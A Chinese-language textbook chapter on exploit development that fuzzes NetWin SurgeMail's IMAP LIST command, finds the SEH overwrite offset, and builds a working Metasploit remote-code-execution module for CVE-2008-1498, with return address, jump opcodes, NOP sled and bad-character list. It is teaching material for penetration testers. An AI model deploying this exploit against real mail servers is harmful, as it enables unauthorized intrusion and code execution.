# 第14章：创建自己的漏洞

作为渗透测试人员，你会经常遇到没有现成 Metasploit 模块的应用程序。在这种情况下，你可以尝试发现应用程序中的漏洞，并为其开发自己的利用代码。

发现漏洞最常用的方法之一是对应用程序进行模糊测试。模糊测试是指向应用程序发送无效、意外或畸形的数据，并监视其是否出现异常（如崩溃）。如果发现漏洞，你就可以着手为其开发利用代码。模糊测试是一个庞大的主题，已有整本书籍专门讨论。在开发可用的利用模块之前，我们仅简要涉及其表面，但你可以使用第201页“总结”中提到的资源更详细地探索模糊测试。

在本章中，我们将逐步介绍通过模糊测试识别漏洞的过程，然后针对该漏洞开发一个利用代码。本章假定你熟悉缓冲区溢出和调试器的使用（我们在第12章中已介绍过），但如果你需要稍作复习，可以在 Exploit Database 网站上找到 corelanc0d3r 编写的一些优秀教程，网址为 https://www.exploit-db.com。

## 模糊测试的艺术

在开发漏洞利用之前，你需要确定目标应用程序中是否存在漏洞。这就是模糊测试的用武之地。我们在第11章中简要讨论了模糊测试器。我们将编写的模糊测试器会向应用程序发送不同长度（由我们指定）的输入，试图导致缓冲区溢出并使应用程序崩溃。

## 下载测试应用程序

我们的模糊测试器以及后续的漏洞利用将针对 NetWin SurgeMail 3.8k4-4 中的一个漏洞，该漏洞由 Matteo Memelli (ryujin) 发现。你可以在 https://www.exploit-db.com/exploits/5259 查看利用代码并下载易受攻击的应用程序。稍后你将看到，该应用程序对 LIST 命令的参数处理不当，导致栈溢出，使攻击者能够远程执行代码。现在安装该应用程序以备后用。

## 编写模糊测试器

以下代码展示了一个简单的 Internet 消息访问协议（IMAP）模糊测试器，旨在使 SurgeMail 应用程序崩溃。将此文件保存为 `imap_fuzz.rb`，放到 `/usr/share/metasploit-framework/modules/auxiliary/fuzzers/imap/` 目录中。但请务必将你的测试模块与 Metasploit 主目录分开存放：

```ruby
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Imap   # ❶
  include Msf::Auxiliary::Dos           # ❷

  def initialize
    super(
      'Name' => 'Simple IMAP Fuzzer',
      'Description' => %q{
        An example of how to build a simple IMAP fuzzer.
        Account IMAP credentials are required in thi
      }
    )   # ❸
  end

  def fuzz_str()
    return Rex::Text.rand_text_alphanumeric(rand(2000))
  end

  def run()
    srand(0)
    connected = connect_login()   # ❹
    if connected
      while(true)
        print_status("Generating fuzzed data...")
        fuzzed = fuzz_str()   # ❺
        print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)
        req = '0002 LIST () "/' + fuzzed + '" "PWNED"' + "\r\n"   # ❻
        print_status(req)
        res = raw_send_recv(req)
        if !res.nil?
          print_status(res)
        else
          print_status("Server crashed or no response - This is a good thing :)")
          break
        end
      end
      disconnect()
    else
      print_status("Host not responding")
    end
  end
end
```

模糊测试器模块首先导入 IMAP ❶ 和拒绝服务 ❷ 的混入（mixin）。包含 IMAP 可以为你提供访问 SurgeMail 所需的登录功能。模糊测试器的目标是使 SurgeMail 服务器崩溃，导致拒绝服务。

我们将模糊字符串（即要发送的畸形数据）设置为一个随机字母数字字符串，最大长度为 2000 字节 ❸。模糊测试器登录远程服务 ❹；如果连接失败并且循环中断，服务器无响应可能意味着你已成功导致远程服务出现异常，值得进一步调查。

变量 `fuzzed` 设置为框架生成的随机字符串 ❺，恶意请求 ❻ 通过将恶意数据附加到易受攻击的 LIST 命令来构建。如果模糊测试器没有收到服务器的响应，它会打印消息“Server crashed or no response”并退出。

模糊测试器需要目标上存在有效的凭据，因此登录到你的测试 SurgeMail 实例的管理门户（位于 http://localhost:7026），并通过“Accounts”选项卡创建凭据。

接下来，使用 `tail` 命令检查日志中是否有与该模块相关的任何错误，然后在 MSFconsole 中使用 `loadpath` 命令加载它：

要测试你的新模糊测试器，请按如下方式设置其选项：

msf > use auxiliary/fuzzers/imap/imap_fuzz

## 控制结构化异常处理程序

如果你重启 SurgeMail 服务，将调试器重新附加到进程，然后重新运行模块，调试器应该会在崩溃点暂停。

如果你使用的是 Immunity Debugger，请通过选择 `View` → `SEH chain` 查看 SEH 链的内容。右键单击该值（应为 41414141），然后选择 `Follow address in stack`，以显示导致 SEH 覆盖的栈内容，如图 14-2 右下窗格所示。

<center>图14-2：被覆盖的 SEH 条目</center>

现在你可以在易受攻击的 `surgenail.exe` 进程上使用过长的缓冲区控制 SEH 链，接下来需要确定在目标上覆盖它所需的确切长度；换句话说，你需要找到覆盖发生的准确位置。

首先，修改模糊测试器代码以创建一个特定长度的、不重复的随机字符串：

```ruby
print_status("Generating fuzzed data...")
fuzzed = Rex::Text.pattern_create(11000)
print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)
req = '0002 LIST () "/' + fuzzed + '" "PWNED"' + "\r\n"
```

在此列表中，我们使用 `Rex::Text.pattern_create` 生成一个不重复的随机字符串，并通过模糊测试器发送。重新运行模糊测试器模块现在显示，目标上的 SEH 被 `684E3368` 覆盖，如图 14-3 所示。

<center>图14-3：被随机字符覆盖的 SEH</center>

请注意，Immunity Debugger 已将此 SEH 条目标记为已损坏。一种称为 SEHOP 的检测技术允许内核检查 SEH 记录列表。出于本练习的目的，我们将禁用此安全功能以及数据执行保护（DEP）；有关禁用 SEHOP 和 DEP 的说明，请参见第 156 页的“禁用保护”。

当 SEH 被我们的随机字符覆盖后，我们可以使用 `/usr/share/metasploit-framework/tools/` 中的 `pattern_offset.rb` 来确定覆盖发生的确切位置，方法是传入感兴趣的字符（`684E3368`）后跟发送到目标的字符串长度（11,000）：

```bash
kali@kali:/usr/share/metasploit-framework/tools/exploit$ sudo ./pattern_offset.rb -l 11000 -q 684e3368
10360
```

值 `10360` 意味着覆盖 SEH 的 4 个字节是紧接着后面的字节；即第 10361、10362、10363 和 10364 字节。我们现在可以最后一次修改模糊测试器代码以验证我们的发现：

```ruby
print_status("Generating fuzzed data...")
fuzzed = "\x41" * 10360 << "\x42" * 4 << "\x43" * 636
print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)
```

如上所示，模糊测试器将构建恶意请求，以 10,360 个 A（十六进制 41）开头，然后是 4 个 B（十六进制 42）以覆盖 SEH，然后是 636 个 C（十六进制 43）作为填充，以保持字符串长度恒定为 11,000 字节。

## 绕过限制

至此，我们完成了模糊测试过程，可以开始针对发现的漏洞开发利用代码。现在我们可以覆盖 SEH，我们希望向目标注入一些自定义 shellcode。然而，在 SEH 覆盖之后，栈结束前可用的 shellcode 空间非常小。

这个漏洞非常适合采用“egg hunter”策略，它使用一小段 shellcode 在内存中搜索主 payload。你可以在以下 Coalfire 博客文章中阅读更多关于 egg hunting 的内容：https://www.coalfire.com/the-coalfire-blog/the-basics-of-exploit-development-3-egg-hunters。

不过，我们将使用另一种策略：用 POP-POP-RETN 指令指针覆盖 SEH。从概念上讲，攻击将如下所示：

`垃圾缓冲区 | NOP 滑板 | Shellcode | 近跳转 | 短跳转 | POP-POP-RETN (3 字节)`

POP-POP-RETN 指令将 ESP 指针向后移动两个位置，使其指向并返回存储在下一个 SEH（NSEH）记录中的值。在这种情况下，我们用短跳转的地址覆盖了 NSEH 记录的值。因此，程序将执行短跳转，向后跳转到近跳转的地址，而不是执行 NSEH。

接下来，我们将使用短跳转获得的空间来执行更大的近跳转，进入 NOP 滑板和 shellcode。虽然这不是必须的，但 NOP 滑板总是漏洞利用的一个很好的补充，因为如果缓冲区在内存中的位置发生变化，它可以给你一点容错空间。这些 NOP 指令不会对利用代码产生不利影响，并将作为填充。

为确保漏洞利用在不同版本的 Windows 之间可移植，最好使用应用程序 DLL 或可执行文件中的返回地址。在这种情况下，我们只能使用应用程序可执行文件本身，因此我们将尝试使用 `surgemail.exe` 文件中的 POP-POP-RETN 指令序列来实现 3 字节的 SEH 覆盖。如果成功，漏洞应该在不同版本的 Windows 上都能工作。

考虑到这一点，让我们构建实际的漏洞。将以下骨架保存在 `/root/.msf6/modules/exploits/windows/imap/` 中：

```ruby
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Imap

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Surgemail 3.8k4-4 IMAP LIST Buffer Overflow',
      'Description' => %q{
        This module exploits a stack overflow in the Surgemail IMAP Server
        version 3.8k4-4 by sending an overly long LIST command.
        Valid IMAP account credentials are required.
      },
      'Author'      => ['ryujin'],
      'License'     => MSF_LICENSE,
      'Version'     => '$Revision: 1 $',
      'References'  =>
        [
          [ 'BID', '28260' ],
          [ 'CVE', '2008-1498' ],
          [ 'URL', 'http://www.exploit-db.com/exploits/5259' ],
        ],
      'Privileged'   => false,
      'DefaultOptions' => { 'EXITFUNC' => 'thread' },
      'Payload'      =>
        {
          'Space'       => 10351,   # ❶
          'DisableNops' => true,
          'BadChars'    => "\x00"
        },
      'Platform'     => 'win',
      'Targets'      =>
        [
          ['Windows Universal', {'Ret' => 0xDEADBEEF}],   # p/p/r TBD ❷
        ],
      'DisclosureDate' => 'March 13 2008',
      'DefaultTarget'  => 0))
  end

  def exploit
    connected = connect_login()   # ❸
    lead = "\x41" * 10360         # ❹
    evil = lead + "\x43" * 4      # ❺
    print_status("Sending payload")
    sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"   # ❻
    sock.put(sploit)              # ❼
    handler
    disconnect
  end
end
```

`Space` 声明 ❶ 指的是可用于 shellcode 的空间大小。这个声明在漏洞模块中非常重要，因为它决定了运行漏洞时 Metasploit 允许你使用哪些 payload。有些 payload 比其他 payload 需要更多空间，所以尽量不要夸大这个值。

编码也会增加 payload 的大小。要查看未编码 payload 的大小，请使用 `info` 命令后跟 payload 的名称，然后查找 `Total size` 值：

```msf
msf > info payload/windows/shell_bind_tcp

Name: Windows Command Shell, Bind TCP Inline
Module: payload/windows/shell_bind_tcp
Version: xxxx
Platform: Windows
Arch: x86
Needs Admin: No
Total size: 341
Rank: Normal
```

`Targets` 部分中的返回地址 ❷ 目前由一个占位符值占据，我们将在漏洞开发过程中稍后更改它。

与之前讨论的模糊测试器模块一样，此漏洞连接到目标并登录 ❸，使用 A 字符串 ❹ 作为初始缓冲区，并附加四个 C ❺ 以覆盖 SEH。它生成整个漏洞字符串 ❻，然后将其发送到目标 ❼。

## 获取返回地址

下一步是在 `surgemail.exe` 中找到一个 POP-POP-RETN 序列。为此，将可执行文件复制到 Kali Linux 机器上的某个位置，然后使用 `msfpescan` 的 `-p` 开关来找到一个合适的候选地址，如下例所示：

```bash
msf > msfpescan -p surgemail.exe

[surgemail.exe]
0x0042e947 pop esi; pop ebp; ret
0x0042f88b pop esi; pop ebp; ret
0x00458e68 pop esi; pop ebp; ret
0x00458edb pop esi; pop ebp; ret
0x0046754d pop esi; pop ebp; ret
0x00467578 pop esi; pop ebp; ret
0x0046d204 pop eax; pop ebp; ret
--snip--
0x0078506e pop ebx; pop ebp; ret
0x00785105 pop ecx; pop ebx; ret
0x0078517e pop esi; pop ebx; ret
```

当对目标可执行文件运行 `msfpescan` 时，它会读取机器代码，寻找与目标（此处为 POP-POP-RETN 序列）匹配的汇编指令。当找到该序列时，它会显示这些指令所在的内存地址。输出显示我们找到了多个候选地址。我们将使用输出末尾的地址 `0x0078517e` 来覆盖漏洞中的 SEH。

编辑漏洞模块的 `Targets` 部分以包含此地址，然后编辑漏洞部分以将其作为要发送的缓冲区的一部分：

```ruby
      'Platform'     => 'win',
      'Targets'      =>
        [
          ['Windows Universal', {'Ret' => "\x7e\x51\x78"}],   # p/p/r in surgemail.exe ❶
        ],
      'DisclosureDate' => 'March 13 2008',
      'DefaultTarget'  => 0))
  end

  def exploit
    connected = connect_login()
    lead = "\x41" * 10360
    evil = lead + [target.ret].pack("A3")   # ❷
    print_status("Sending payload")
    sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
    sock.put(sploit)
    handler
    disconnect
  end
```

为了执行 SEH 的 3 字节覆盖，我们在 `Targets` 块中以小端序设置要添加到缓冲区的 3 个字节，如上列表中的粗体所示。

我们将恶意字符串中的三个 C 替换为 `[target.ret].pack("A3")`，这将按 `Targets` 块中声明的原样发送返回地址。在修改许多使用 3 字节覆盖的漏洞时，你可以直接声明目标地址（此处为 `0x0078517e`），当你使用 `[target.ret].pack('V')` 时，Metasploit 将自动正确排序字节。

现在是运行漏洞以确保其正常工作的时候了。如果在开发漏洞时跳跃得太快，你可能会在某处犯错，并需要进行大量回溯才能找出问题所在。以下是漏洞运行的情况：

```msf
msf > use exploit/windows/imap/surgemail_book
msf exploit(surgemail_book) > set IMAPPASS test
IMAPPASS => test
msf exploit(surgemail_book) > set IMAPUSER test
IMAPUSER => test
msf exploit(surgemail_book) > set RHOST 192.168.1.155
RHOST => 192.168.1.155
msf exploit(surgemail_book) > set PAYLOAD generic/debug_trap   # ❶
PAYLOAD => generic/debug_trap
msf exploit(surgemail_book) > exploit

[*] Authenticating as test with password test...
[*] Sending payload
[*] Exploit completed, but no session was created.
msf exploit(surgemail_book) >
```

我们使用的 payload `generic/debug_trap` ❶ 不会发送真正的 payload。相反，它发送多个 `\xcc` 值（断点）来调试漏洞的执行流。这对于确认 shellcode 是否插入到漏洞中的正确位置很有用。

运行漏洞后，打开调试器。如果你使用的是 Immunity Debugger，如图 14-4 所示，进入崩溃点并选择 `View` → `SEH chain`。按 F2 设置断点，然后按 SHIFT-F9 将异常传递给应用程序并单步进入 POP-POP-RETN 指令序列。

## 添加向后短跳转与近跳转

接下来，编辑漏洞利用代码，加入向后短跳转的指令：

在编辑漏洞时，请确保在进行更改时调整初始缓冲区长度，否则对齐将出错。在这种情况下，NSEH 被覆盖为向后短跳转 5 字节的指令（`\xeb\xf9\x90\x90`），其中 `eb` 是短跳转的操作码，`\xf9` 是相对地址。新的前导缓冲区长度调整为 10,356 字节，因为这 5 个新字节出现在 SEH 覆盖之前。

当你再次运行漏洞并在调试器中单步执行指令时，应该在异常处理程序值和短跳转值之前落在 41（十六进制 A）上。

接下来，处理五个 INC ECX 指令，目前它们填充了五个 A，由十六进制值 0x41 表示。你将用近跳转指令序列（`\xe9\xdd\xd7\xff\xff`）替换这些 A，以向后跳转到缓冲区开头附近的位置。在调试器中查看缓冲区时，你应该看到整个 A 字符串完好无损，留下超过 10,000 字节可用于 shellcode。由于功能性 shellcode 所需的平均空间小于 500 字节，你应该有足够的空间。

现在你所要做的就是用 NOP（`\x90`）替换 A 缓冲区，为自己提供一个漂亮的 NOP 滑板，然后你就可以坐等 Metasploit 处理 shellcode 了：

```ruby
  def exploit
    connected = connect_login()
    lead = "\x90" * (10351 - payload.encoded.length)   # ❶
    near = "\xe9\xdd\xd7\xff\xff"                      # ❷
    nseh = "\xeb\xf9\x90\x90"
    evil = lead + payload.encoded + near + nseh + [target.ret].pack("A3")   # ❸
    print_status("Sending payload")
    sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
    sock.put(sploit)
    handler
    disconnect
  end
```

在此列表中，我们将之前使用的初始 A 字符串替换为 NOP，减去 Metasploit 生成的 shellcode 的长度 ❶。请注意，缓冲区长度最初为 10,356 字节，现在减少了 5 字节，变为 10,351 字节，以适应近跳转指令 ❷。最后，我们使用漏洞的所有组件构建了恶意字符串 ❸。

## 坏字符与远程代码执行

如果你检查调试器，你会发现应用程序甚至没有崩溃。那么发生了什么？欢迎来到有时具有挑战性、几乎总是令人沮丧的坏字符世界。某些字符如果作为漏洞缓冲区的一部分发送，在应用程序读取时会被破坏。不幸的结果是，坏字符会使你的 shellcode（有时甚至是整个漏洞）无法使用。

在编写 Metasploit 模块时，你应该始终确保识别所有坏字符，因为 Metasploit 生成的编码 shellcode 在每次启动漏洞时都会不同，任何 rogue 坏字符都会大大降低模块的可靠性。在许多情况下，如果你未能找到所有坏字符，应用程序会在运行 shellcode 之前崩溃。在前面的例子中，SurgeMail 甚至没有崩溃。漏洞似乎成功了，但我们没有得到会话。

有多种方法可以识别坏字符，包括将动态创建的 shellcode 替换为顺序字符字符串（`\x00\x01\x02...`），检查调试器以查看第一个字符在哪里被破坏，并将该字符标记为坏字符。例如，以下是与该漏洞相关的一些坏字符列表：`\x00\x09\x0a\x0b\x0c\x0d\x20\x2c\x3a\x40\x7b`。

更新漏洞模块以包含此列表：

```ruby
      'Privileged'   => false,
      'DefaultOptions' => { 'EXITFUNC' => 'thread' },
      'Payload'      =>
        {
          'Space'       => 10351,
          'DisableNops' => true,
          'BadChars'    => "\x00\x09\x0a\x0b\x0c\x0d\x20\x2c\x3a\x40\x7b"
        },
      'Platform'     => 'win',
      'Targets'      =>
```

当漏洞模块声明 `BadChars` 变量时，Metasploit 将自动从其值中排除 shellcode 以及任何自动生成的文本或 NOP 字符串。

## 总结

虽然我们在本章中没有发现新的漏洞，但我们涵盖了从开发和运行模糊测试器到开发功能完整的漏洞的整个过程。我们在本章中构建的漏洞复杂且不寻常，因此它提供了一个极好的机会来探索获得代码执行的创造性途径。
